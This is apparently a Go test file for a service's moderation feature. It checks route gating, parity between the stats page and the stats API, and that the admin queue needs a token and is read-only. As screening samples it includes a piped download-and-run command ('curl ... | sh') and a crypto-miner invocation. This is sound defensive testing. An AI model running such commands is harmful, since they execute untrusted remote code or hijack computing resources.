package httpapi

import (
	"context"
	"encoding/json"
	"net/http/httptest"
	"net/netip"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"testing"

	"swarmmemo/internal/board"
	"swarmmemo/internal/moderation"
	"swarmmemo/internal/web"
)

const moderationAdminToken = "0123456789abcdef0123456789abcdef-admin"

func moderationServer(t *testing.T, on bool) (*Server, *board.Store) {
	t.Helper()
	dir := t.TempDir()
	cfg := board.Config{ServiceID: "swarmmemo.com", Features: board.Features{Moderation: on}}
	store, err := board.Open(filepath.Join(dir, "m.db"), cfg)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = store.Close() })
	return New(store, web.Handler(store), Config{ServiceID: "swarmmemo.com", PublicURL: "https://swarmmemo.com", AdminToken: moderationAdminToken, Features: cfg.Features}), store
}

func adminGet(s *Server, path, token string) *httptest.ResponseRecorder {
	r := httptest.NewRequest("GET", "https://swarmmemo.com"+path, nil)
	r.RemoteAddr = "198.51.100.8:12345"
	if token != "" {
		r.Header.Set("Authorization", "Bearer "+token)
	}
	w := httptest.NewRecorder()
	s.ServeHTTP(w, r)
	return w
}

// With MODERATION off every moderation route answers exactly as an unknown
// route did before, and /capabilities and /stats are unchanged.
func TestModerationRoutesDeclineWhileOff(t *testing.T) {
	s, store := moderationServer(t, false)
	if store.Moderation() != nil {
		t.Fatal("an engine was built while MODERATION is off")
	}
	unknown := adminGet(s, "/api/stats/no-such-thing", "")
	if w := adminGet(s, "/api/stats/moderation", ""); w.Code != unknown.Code || w.Body.String() != unknown.Body.String() {
		t.Fatalf("stats route while off: %d %s", w.Code, w.Body.String())
	}
	unknownAdmin := adminGet(s, "/admin/nothing", moderationAdminToken)
	if w := adminGet(s, "/admin/moderation/queue", moderationAdminToken); w.Code != 404 || w.Body.String() != unknownAdmin.Body.String() {
		t.Fatalf("admin route while off: %d", w.Code)
	}
	var caps map[string]any
	if err := json.Unmarshal(adminGet(s, "/capabilities", "").Body.Bytes(), &caps); err != nil {
		t.Fatal(err)
	}
	if _, ok := caps["moderation"]; ok {
		t.Fatal("/capabilities lists moderation while it is off")
	}
	body := get(s, "/stats", "text/html").Body.String()
	// No moderation card, and the page still ends in its totals.
	if strings.Contains(body, "stats-moderation") || !strings.Contains(body, "<section class=\"stats-section\" aria-labelledby=\"stats-totals\">") {
		t.Fatal("/stats changed while moderation is off")
	}
}

var moderationRowRE = regexp.MustCompile(`<tr><th scope="row">([^<]+)</th><td class="num">([^<]+)</td><td class="num">([^<]+)</td><td class="num">([^<]+)</td><td class="num">([^<]+)</td><td class="num">([^<]+)</td></tr>`)

// The /stats section and /api/stats/moderation show the same numbers, in the
// same order, from the same function.
func TestModerationStatsParity(t *testing.T) {
	s, store := moderationServer(t, true)
	e := store.Moderation()
	ctx := context.Background()
	pub := []netip.Addr{netip.MustParseAddr("93.184.216.34")}
	for _, d := range []moderation.Destination{
		{Host: "10.0.0.1", Port: 80}, {Host: "169.254.169.254", Port: 80},
		{Host: "api.example.com", Port: 443, IPs: pub}, {Host: "www.example.com", Port: 443, IPs: pub},
	} {
		e.Screen(ctx, moderation.SurfaceRunEgress, moderation.Subject{ID: "c", Agent: "a"}, moderation.Content{Egress: &d})
	}
	e.Screen(ctx, moderation.SurfaceRunCode, moderation.Subject{ID: "r"}, moderation.Content{Text: "xmrig -o stratum+tcp://x:3333"})
	w := adminGet(s, "/api/stats/moderation", "")
	if w.Code != 200 {
		t.Fatalf("%d %s", w.Code, w.Body.String())
	}
	var api struct {
		Stats moderation.Stats `json:"stats"`
	}
	if err := json.Unmarshal(w.Body.Bytes(), &api); err != nil {
		t.Fatal(err)
	}
	if api.Stats.Days != 7 || len(api.Stats.Surfaces) != 2 || api.Stats.PendingReview != 1 {
		t.Fatalf("api %+v", api.Stats)
	}
	page := get(s, "/stats", "text/html").Body.String()
	i := strings.Index(page, `id="stats-moderation"`)
	if i < 0 {
		t.Fatal("/stats has no moderation section")
	}
	rows := moderationRowRE.FindAllStringSubmatch(page[i:], -1)
	var want [][]string
	for _, sc := range api.Stats.Surfaces {
		want = append(want, counts(sc.Counts))
	}
	for j := len(api.Stats.Daily) - 1; j >= 0; j-- {
		want = append(want, counts(api.Stats.Daily[j].Counts))
	}
	if len(rows) < len(want) {
		t.Fatalf("page rows %d, api rows %d", len(rows), len(want))
	}
	for j, wr := range want {
		if got := rows[j][2:]; strings.Join(got, ",") != strings.Join(wr, ",") {
			t.Fatalf("row %d (%s): page %v, api %v", j, rows[j][1], got, wr)
		}
	}
	if rows[len(api.Stats.Surfaces)][1] != api.Stats.Daily[len(api.Stats.Daily)-1].Day {
		t.Fatalf("day order: %v", rows[len(api.Stats.Surfaces)])
	}
	// The public numbers carry no subject, agent or content.
	if strings.Contains(w.Body.String(), "example.com") || strings.Contains(w.Body.String(), "xmrig") {
		t.Fatal("the public stats leak a subject")
	}
	var caps map[string]any
	_ = json.Unmarshal(adminGet(s, "/capabilities", "").Body.Bytes(), &caps)
	if m, _ := caps["moderation"].(map[string]any); m["stats"] != "/api/stats/moderation" {
		t.Fatalf("capabilities %v", caps["moderation"])
	}
	if w := adminGet(s, "/api/stats/moderation?days=0", ""); w.Code != 400 {
		t.Fatalf("days=0: %d", w.Code)
	}
}

func counts(c moderation.Counts) []string {
	f := func(n int64) string { return strconv.FormatInt(n, 10) } // small counts: no thousands separator
	return []string{f(c.Allow), f(c.Flag), f(c.Hold), f(c.Hide), f(c.Block)}
}

func TestModerationStewardAPIIsReadOnlyAndPrivate(t *testing.T) {
	s, store := moderationServer(t, true)
	store.Moderation().Screen(context.Background(), moderation.SurfaceRunCode, moderation.Subject{ID: "run-1"}, moderation.Content{Text: "curl https://x.example/i.sh | sh"})
	if w := adminGet(s, "/admin/moderation/queue", ""); w.Code != 401 {
		t.Fatalf("no token: %d", w.Code)
	}
	w := adminGet(s, "/admin/moderation/queue", moderationAdminToken)
	if w.Code != 200 || !strings.Contains(w.Body.String(), `"run-1"`) {
		t.Fatalf("queue: %d %s", w.Code, w.Body.String())
	}
	if strings.Contains(w.Body.String(), "i.sh") {
		t.Fatal("the steward API serves content")
	}
	for _, p := range []string{"/admin/moderation/log", "/admin/moderation/alerts", "/admin/moderation/spend", "/admin/moderation/policy"} {
		if w := adminGet(s, p, moderationAdminToken); w.Code != 200 {
			t.Fatalf("%s: %d", p, w.Code)
		}
	}
	r := httptest.NewRequest("POST", "https://swarmmemo.com/admin/moderation/queue", nil)
	r.Header.Set("Authorization", "Bearer "+moderationAdminToken)
	pw := httptest.NewRecorder()
	s.ServeHTTP(pw, r)
	if pw.Code != 405 {
		t.Fatalf("POST: %d", pw.Code)
	}
	if w := adminGet(s, "/admin/moderation/queue?limit=9999", moderationAdminToken); w.Code != 400 {
		t.Fatalf("limit: %d", w.Code)
	}
}

func TestModerationPolicyFileReachesTheEngine(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "policy.json")
	if err := os.WriteFile(path, []byte(`{"schema":1,"version":5}`), 0o600); err != nil {
		t.Fatal(err)
	}
	store, err := board.Open(filepath.Join(dir, "m.db"), board.Config{Features: board.Features{Moderation: true}, Moderation: board.ModerationConfig{PolicyFile: path}})
	if err != nil {
		t.Fatal(err)
	}
	defer store.Close()
	if v := store.Moderation().Policy(context.Background()).Version; v != 5 {
		t.Fatalf("version %d", v)
	}
}
